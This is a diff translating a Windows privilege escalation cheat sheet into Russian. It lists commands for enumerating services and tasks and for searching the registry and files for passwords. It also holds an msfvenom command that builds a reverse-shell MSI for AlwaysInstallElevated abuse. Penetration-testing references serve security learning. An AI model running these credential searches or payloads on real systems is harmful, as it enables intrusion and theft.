@@ -1,14 +1,12 @@
 # Services and Tokens
 
-Windows privilege escalation commands for service permissions, unquoted paths, DLL hijacking, tokens, UAC, installer policies and credentials.
+**Что такое повышение привилегий в Windows?**
 
-**What is Windows Privilege Escalation?**
+Повышение привилегий в Windows зависит от текущего токена и разрешений, назначенных службам, файлам, разделам реестра и задачам. Подозрительный путь службы или имя привилегии — это лишь зацепка; для эксплуатации также требуется соответствующий доступ на запись, состояние токена или поведение службы.
 
-Windows privilege escalation depends on the current token and the permissions attached to services, files, registry keys and tasks. A suspicious service path or privilege name is a lead; exploitation also requires the matching write access, token state or service behavior.
+Команды PowerShell и встроенные команды Windows позволяют исследовать текущую машину. Перед проверкой связанных ACL замените заполнители имён служб и каталогов на реальные значения.
 
-PowerShell and native Windows commands inspect the current machine. Replace service and directory placeholders before checking the associated ACLs.
-
-System info, current user privileges, and admin group membership
+Сведения о системе, текущие привилегии пользователя и членство в группе администраторов.
 
 ```
 systeminfo
@@ -17,72 +15,72 @@ net user %username%
 net localgroup administrators
 ```
 
-Enumerate services — look for unquoted paths and weak permissions
+Перечисление служб — ищите пути без кавычек и слабые разрешения.
 
 ```
 wmic service get name,displayname,pathname,startmode
 sc qc <service_name>
 ```
 
-List scheduled tasks with run-as user context
+Список запланированных задач с указанием контекста пользователя, от имени которого они выполняются.
 
 ```
 schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status"
 ```
 
-Enumerate autorun registry keys
+Перечисление ключей реестра автозапуска
 
 ```
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 ```
 
-Search registry for password strings
+Поиск в реестре строк с паролями.
 
 ```
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-Installed software — check for vulnerable versions
+Установленное программное обеспечение — проверьте наличие уязвимых версий.
 
 ```
 wmic product get name,version,vendor | sort
 ```
 
-Network configuration — find internal hosts for lateral movement
+Сетевая конфигурация — поиск внутренних хостов для горизонтального перемещения (lateral movement).
 
 ```
 ipconfig /all && route print && arp -a
 ```
 
-Listening ports — check for internal services
+Прослушиваемые порты — проверьте наличие внутренних служб
 
 ```
 netstat -ano | findstr LISTENING
 ```
 
-Search filesystem for credential files
+Поиск файлов с учётными данными в файловой системе.
 
 ```
 findstr /si password *.txt *.xml *.config 2>nul
 dir /s /b *pass* *cred* *vnc* *.config 2>nul
 ```
 
-PowerShell credential file search
+Поиск файлов с учётными данными средствами PowerShell.
 
 ```
 PowerShell: Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|credential" 2>$null
 ```
 
-Find directories writable by Authenticated Users / Everyone (Sysinternals accesschk)
+Поиск каталогов, доступных на запись группам Authenticated Users / Everyone (Sysinternals accesschk)
 
 ```
 accesschk.exe -uwdqs "Authenticated Users" C:\ 2>nul
 accesschk.exe -uwdqs "Everyone" C:\ 2>nul
 ```
 
-Check if AlwaysInstallElevated is enabled (both HKCU and HKLM must be 1)
+Проверка, включён ли параметр AlwaysInstallElevated (значение 1 должно быть установлено и в HKCU, и в HKLM)
 
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -90,7 +88,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 # Both must be 0x1 for exploitation
 ```
 
-Generate and install malicious MSI with SYSTEM privileges
+Создание и установка вредоносного MSI-пакета с привилегиями SYSTEM
 
 ```
 # Generate malicious MSI (Linux/Windows):
@@ -100,7 +98,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.m
 msiexec /quiet /qn /i evil.msi
 ```
 
-Download and execute MSI via PowerShell
+Загрузка и запуск MSI через PowerShell
 
 ```
 # PowerShell PrivEsc via AlwaysInstallElevated:
